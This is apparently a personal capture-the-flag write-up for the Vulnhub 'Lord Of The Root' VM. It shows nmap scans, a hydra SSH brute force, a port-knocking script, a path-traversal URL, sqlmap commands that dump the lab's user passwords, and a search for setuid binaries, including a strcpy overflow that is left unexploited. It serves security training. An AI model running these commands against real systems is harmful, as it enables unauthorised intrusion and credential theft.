## Vulnhub: Lord Of The Root
the table of contents extension for vscode seems to break after too many sections, more below "ssh login"
<!-- TOC -->

- [Vulnhub: Lord Of The Root](#vulnhub-lord-of-the-root)
    - [Speculations and Hints](#speculations-and-hints)
    - [Lessons Learned](#lessons-learned)
    - [VM ToDos](#vm-todos)
    - [Network Discovery](#network-discovery)
    - [Metasploit Work](#metasploit-work)
    - [SSH Service](#ssh-service)
    - [Port Knocking](#port-knocking)
    - [Apache Service](#apache-service)
        - [weird steganography tangent](#weird-steganography-tangent)
        - [back on track, finding interesting comments in html](#back-on-track-finding-interesting-comments-in-html)
        - [brute force attempt on login webpage](#brute-force-attempt-on-login-webpage)
        - [sqlmap success](#sqlmap-success)
    - [Remote Shell (ssh login)](#remote-shell-ssh-login)

<!-- /TOC -->
***
### Speculations and Hints
* smeagol is the default login from the vm's GUI console
* the word "knock" is used in the `ssh` banner.  possibly a hint to try port knocking
* images from web page - steganography??

***
### Lessons Learned
* do more reading on dirtycow (probably not relevant to this vm, but questions came up for me)
* what are best practices/tools for pentesting `knockd`?
* always read the source in these web pages right away. 2nd VM with a clue in html comments.  Way too much overthinking to jump to steganography for a clue before looking thoroughly at the webpage source.  Burp has a handy comments parser btw

***
### VM ToDos
* [x] port scan  
* [x] port knocking 
* [x] port knocking clients or `scapy` for port knocking
* [x] fuzz the login page in the hidden webdir (start with sqli)
* [ ] reverse and exploit the SECRET/door1/file setuid binary

***
### Network Discovery
sweeping no-ping scan of subnet to find target
```
nmap -Pn 192.168.86.0/24

Nmap scan report for 192.168.86.144
Host is up (0.00045s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:19:9B:E6 (VMware)
```
TCP Syn Scan with light service detection
```
root@kali:~/LordOfTheRoot# nmap -sS 192.168.86.144 -p- -oA outputfile.out -v -sV --version-intensity 2
```
UDP Scan
```
nmap 192.168.86.144 -sU -oA udpscan.out
```
nmap with vuln scripts: (this is crap don’t even do it)
```
nmap -sS 192.168.86.144 -p- -oA outputfile.out -v -sV --script vuln
```

***
### Metasploit Work
add a workspace  
load all the nmap output  
```
msf > workspace -a LordOfTheRoot
msf > db_load ~/LordOfTheRoot *.xml
```
check hosts and services found by `nmap`
```
msf > hosts

Hosts
=====

address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------  ---------  -----  -------  ----  --------
192.168.86.144  00:0c:29:19:9b:e6        Unknown                    device         

msf > services

Services
========

host            port  proto  name  state  info
----            ----  -----  ----  -----  ----
192.168.86.144  22    tcp    ssh   open   OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 Ubuntu Linux; protocol 2.0
***
### SSH Service
only service running on tcp/udp is SSH

```

OpenSSH 6.6.1p1
[CVEDetails]( https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-188831/Openbsd-Openssh-6.6.html)   
nothing too interesting for getting access

```
root@kali:~/LordOfTheRoot# ssh 192.168.86.144
The authenticity of host '192.168.86.144 (192.168.86.144)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.86.144' (ECDSA) to the list of known hosts.


                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/

Easy as 1,2,3
root@192.168.86.144's password: 
```

the word "knock" in this banner makes me think
* subdomain enumeration - but this isn't going to be it for a single vm
* port knocking 

Also tried a few wild guesses: user root, passwords “” “knock” “knockfriend” “KnockFriend”  

Next thing is it’s possibly some LOTR reference, so google around for possible username/passwords related to that passage in the books  

***
### SSH Service

when the vm booted, `smeagol` was set as the default login user…  
tried a quick wordlist attack on the ssh server using `hydra`, but looks like this ssh server only takes keys.. or hydra is just misunderstanding a response

```
hydra options
-l single username
-P password list
-o output file
-t1 one thread
-v verbose
-f exit when login pair is found

root@kali:~/LordOfTheRoot# hydra -l smeagol -P ~/SecLists/Passwords/10k_most_common.txt ssh://192.168.86.144 -o hydra.out -t1 -v -f
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-17 23:09:02
[DATA] max 1 task per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~156 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://192.168.86.144:22
[ERROR] target ssh://192.168.86.144:22/ does not support password authentication.
```
***
### Port Knocking
- this vulnhub is using standard `knockd`
- - as seen in the process list when logging in at the console as guest
- - <https://github.com/jvinet/knock>
- `/etc/knockd.conf` only readable by root
- sequence is probably something to do with 1 2 3 from the banner-hint
- there are some port knocking clients that could be used
- this page demonstrates using `nmap` from a simple script to knock ports <https://wiki.archlinux.org/index.php/Port_knocking>

```
#!/bin/bash
HOST=$1
shift
for ARG in "$@"
do
        nmap -Pn --host_timeout 100 --max-retries 0 -p $ARG $HOST
done
```
script's first arg is the host you're knocking  
any additional args are ports you want to knock  

overthinking on my first try i knocked ports 1111,2222,3333  
but if you just take the hint given by the ssh banner...
```
root@kali:~# ./knock.sh 192.168.86.144 1 2 3
<a bunch of knock.sh nmap output snipped>
```
then we rerun a regular port scan...
```
root@kali:~# nmap -sS 192.168.86.144 -p- -oA outputfile.out -v -sV --version-intensity 2

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```
`knockd` has opened up the 1337 port where the web server is listening

***
### Apache Service

version 2.4.7 (Ubuntu)  
just firing up `burp` and hitting the 1337 port, I get a weird image back  
`iwilldoit.jpg`  
with the caption 
```
I WILL DO IT  
I WILL TAKE THE 
RING INTO 
MORDOR
```
I happen to have burp Pro so i use its content discovery feature  
dirb, dirbuster, owasp zap are other options for content discovery  
I've only done a couple of these Vulnhub labs yet, and so far it's been LAMP stack, so I focus discovery on .php to start  

<http://192.168.86.144:1337/home.php>  
LFI attempt:   
<http://192.168.86.144:1337/home.php?../../../../etc/passwd>  
<http://192.168.86.144:1337/robots.txt>  
both return another meme image  
```
SAM WE CANT GO THIS WAY
THE BLACK GATE IS TOO MAINSTREAM
```
another image is found with a bunch of Legolas memes  

<http://192.168.86.144:1337/images/>  
has directory browsing/index enabled  

```
hipster.jpg	2015-09-17 16:23 	71K	 
iwilldoit.jpg	2015-09-17 16:25 	36K	 
legolas.jpg	2015-09-17 16:26 	175K	 
```
#### weird steganography tangent

probably means nothing, but one images is much larger than the other two.  It's also the one that doesn't discourage us, but just repeats the name "legolas"  
this makes me think it might be interesting to run it through a steganography program with the "legolas" password and see if anything interesting is returned

<https://www.blackmoreops.com/2017/01/11/steganography-in-kali-linux-hiding-data-in-image/>  
trying words found in the legolas jpg first 

```
root@kali:~/LordOfTheRoot/images# steghide extract -p leglesslegolas -sf legolas.jpg
steghide: could not extract any data with that passphrase!
root@kali:~/LordOfTheRoot/images# steghide extract -sf legolas.jpg -p leggomylegoeggoleglesslegolegolas
steghide: could not extract any data with that passphrase!
root@kali:~/LordOfTheRoot/images# steghide extract -sf legolas.jpg -p "leglesslegolegolas\'s lego lass"
steghide: could not extract any data with that passphrase!
```
starting to think ths was a pretty desperate attempt...  
going to try another route  
will make a word list (including uppercase) if i come back to this steganography

#### back on track, finding interesting comments in html

another look at home.php shows an html comment just after the image tag
```
<html>
<img src="/images/hipster.jpg" align="middle">
<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
</html>
```
base64 decode the string (i just select the string in burp and right-click)
```
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
```
pretty clearly another base64 encoded string  
I copy it from the mini-decoder in burp and plug it into the decoder tab and base64 decode
```
/978345210/index.php 
```
<http://192.168.86.144:1337/978345210/index.php>  
is a login page
```
<title>LOTR Login!</title>
</head>
<body>
<div id="main">
<h1>Welcome to the Gates of Mordor</h1>
<div id="login">
<form action="" method="post">
<label>User :</label>
<input id="name" name="username" placeholder="username" type="text"><br>
<label>Password :</label>
<input id="password" name="password" placeholder="**********" type="password">
```
also found under <http://192.168.86.144:1337/978345210/>  
login.php  
logout.php  
profile.php  

the profile page references the `legolas.img` from the previous `image` directory  

#### brute force attempt on login webpage
brute forcing the password using legolas as user and trying some of burps default password lists doesn't turn anything up.  
trying a custom wordlist using burps mixed-case payload on the password parameter.  it just mixes the case of a supplied wordlist.  
trying these words from the images found
```
legolas
smeagol
leg
sam
blackgate
black gate
mainstream
mordor
ring
legless
leglesslegolas
leglesslegolas
lego
legolegolas
leglesslegolegolas
leglesslegolegloas's lego lass
```
this turns up nothing

#### sqlmap success

meanwhile running burp's active scanner on `/978345210/index.php` and a SQLi is reported.
use burp to save my last username/password form `POST` to a file `post.out`  
run `sqlmap` using that saved burp `POST` output
```
/usr/bin/sqlmap -r post.out --output-dir='/root/LordOfTheRoot/sqlmap' --level=2 --risk=2 --dbms='MySQL 14.14' -a
```
<https://github.com/sqlmapproject/sqlmap/wiki/Usage>  
```
-r specifies the input file (burp's saved POST request)  
--output-dir specifies a custom output directory, by default sqlmap puts output in `~/.sqlmap/`  
--level=2 is sqlmaps level of testing (1-5). Each level will attempt to test more parameters, and will add additional tests  
--risk=2 (1-3) 2 just adds longer query time tests, risk=3 might update data  
--dbms specifies the database and version that you're attacking.  I know the version because it's shown when logged in as guest from the console and peforming a `ps`  
-a says dump everything you can from the database  
```

At some point during this `sqlmap` run, it's going to pick up password hashes and ask you if you want to try to crack them, say yes and the root password is found to be 

```
[*] root [1]:
    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
    clear-text password: darkshadow
```

this full dump `-a` was taking way too long, so I quit and just went for the databases and table data

```
/usr/bin/sqlmap -r post.out --output-dir='/root/LordOfTheRoot/sqlmap' --level=2 --risk=2 --dbms='MySQL 14.14' --dbs
> answer defaults to the questions about redirects, injections and optimizations

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp
```
dump the Webapp database

```
root@kali:~/LordOfTheRoot/sqlmap# sqlmap -r post.out --output-dir='/root/LordOfTheRoot/sqlmap2/' --level=2 --risk=1 --dbms='MySQL 14.14' -D Webapp --dump`
> again, answer defaults
Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```
the only login that's in /etc/passwd is `smeagol` so try that username/password from `ssh`

***
### Remote Shell (ssh login)

```
smeagol@192.168.86.144's password:
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

                            .____    _____________________________
                            |    |   \_____  \__    ___/\______   \
                            |    |    /   |   \|    |    |       _/
                            |    |___/    |    \    |    |    |   \
                            |_______ \_______  /____|    |____|_  /
                                    \/       \/                 \/
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ |
 \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ |
  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  \___  /   |__|  |__|\___  >___|  /\____ |
       \/       \/          \/            \/     \/       \/                  \/     \/      \/
Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
smeagol@LordOfTheRoot:~$
```

now with shell
```
smeagol@LordOfTheRoot:~$ sudo -l
[sudo] password for smeagol:
Sorry, user smeagol may not run sudo on LordOfTheRoot.
smeagol@LordOfTheRoot:~$
```
try su to root with password `darkshadow`
```
smeagol@LordOfTheRoot:~$ su
Password:
su: Authentication failure
smeagol@LordOfTheRoot:~$
```

first looked through a list of everything in /home and /etc 
```
find /home > home.out
find /etc > etc.out
```
then looked for all root-owned setuids or setgids and find some goodies...
```
 find / -user root \( -perm -4000 -o -perm -2000 \) > setuids.out
 
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file

 ```
door1 looks like the likely candidate given it's the one with a different file size
```
smeagol@LordOfTheRoot:/SECRET$ ls -lR
total 12
drwxr-xr-x 2 root root 4096 Apr 25 23:39 door1
drwxr-xr-x 2 root root 4096 Apr 25 23:39 door2
drwxr-xr-x 2 root root 4096 Apr 25 23:39 door3

./door1:
total 8
-rwsr-xr-x 1 root root 5150 Sep 22  2015 file

./door2:
total 8
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file

./door3:
total 8
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
```
binary compare of door2 and door3 indicate they're the same
```
smeagol@LordOfTheRoot:/SECRET$ cmp door2/file door3/file
smeagol@LordOfTheRoot:/SECRET$ cmp door2/file door1/file
door2/file door1/file differ: byte 25, line 1
```

uploaded each binary to a decompiler <https://www.onlinedisassembler.com/odaweb>  
door2 and door3 just exit if you give them an argument, otherwise they print usage and exit

```c
int main(int argc, char ** argv) {
    if (argc > 1) {
        return 0;
    }
    printf("Syntax: %s <input string>\n", (char *)*(int32_t *)argv);
    exit(0);
}
```

door1 is what we need to exploit

```c
int main(int argc, char ** argv) {
    if (argc > 1) {
        int32_t str2 = *(int32_t *)((int32_t)argv + 4); 
        int32_t str;
        strcpy((char *)&str, (char *)str2);
        return 0;
    }
    printf("Syntax: %s <input string>\n", (char *)*(int32_t *)argv);
    exit(0);
}
```

assembly
```assembly
Dump of assembler code for function main:
   0x0804844d <+0>:     push   ebp
   0x0804844e <+1>: 	mov    ebp,esp
   0x08048450 <+3>: 	and    esp,0xfffffff0
   0x08048453 <+6>: 	sub    esp,0xb0
stack is set up 
testing if we have one arg
   0x08048459 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
if no args, then jump to 51 and exit
JG is "Jump if greater" ZF = 0 and SF = OF
   0x0804845d <+16>:	jg     0x8048480 <main+51>
move DWORD PTR ebp+0xc into eax
   0x0804845f <+18>:	mov    eax,DWORD PTR [ebp+0xc]
move DWORD PTR eax into eax
   0x08048462 <+21>:	mov    eax,DWORD PTR [eax]
move eax into the stack +4
   0x08048464 <+23>:	mov    DWORD PTR [esp+0x4],eax
move 0x8048520 into DWORD PTR STack 
   0x08048468 <+27>:	mov    DWORD PTR [esp],0x8048520
Call Print... is 0x8048310 the thing we're printign, or the location of print, or the return address?
   0x0804846f <+34>:	call   0x8048310 <printf@plt>
move 0 into DWORD PTR stack
   0x08048474 <+39>:	mov    DWORD PTR [esp],0x0
exit
   0x0804847b <+46>:	call   0x8048330 <exit@plt>
   0x08048480 <+51>:	mov    eax,0x0
   0x08048485 <+56>:	leave
   0x08048486 <+57>:	ret
End of assembler dump.
(gdb)
```


#### Resume Here

***
### Local Shell (console login)
from Ubuntu login screen a guest session can log in

#### Kernel
`uname -r` shows  
3.19.0-25-generic

some googling suggests that 3.19 might be vulnerable to dirtycow
<https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions>

I downloaded/compiled/ran a couple dirtycow exploits, but didn't have any success.  It's possible even though the docs suggest kernel 3.19 is vulnerable, that i'm misreading or this is a patched version of 3.19  
Need to do more reading on dirtycow...

#### Processes
with guess access from the ubuntu console, i'm able to run `ps`
```
$ ps aux | less
```
interesting processes running 
- rsyslogd - not going to be listening on a port, but should check the version for CVEs
- sshd running (we knew that from our port scan)
- mysqld version 14.14 - juicy
- knockd - the port knock server
    - next step is to knock some ports to get network access
- apache2 - really juicy
   - 6 apache processes running  
   - 1 running as root - i'm assuming this is an apache init process, been a while since I've done any web admin
   - 5 running as additional workers - possibly supporting multiple sites/ports?

